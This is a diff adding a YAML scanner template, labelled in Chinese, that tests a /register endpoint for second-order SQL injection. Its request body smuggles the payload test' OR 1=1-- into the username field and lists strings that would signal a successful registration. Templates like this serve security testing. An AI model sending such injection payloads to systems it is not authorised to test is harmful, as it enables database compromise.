@@ -1,0 +1,25 @@
+name: 二阶SQL注入测试
+description: 测试二阶SQL注入漏洞
+level: 高
+author: Test
+request:
+  method: POST
+  path: /register
+  params:
+    action: "create"
+  headers:
+    Content-Type: "application/x-www-form-urlencoded"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+  body: "username=test' OR 1=1--&password=test123&email=test@example.com"
+response:
+  matchType: contains
+  successIndicators:
+    - "registration successful"
+    - "注册成功"
+    - "account created"
+  errorIndicators:
+    - "registration failed"
+    - "invalid input"
+    - "无效输入"
+  statusCode: 200
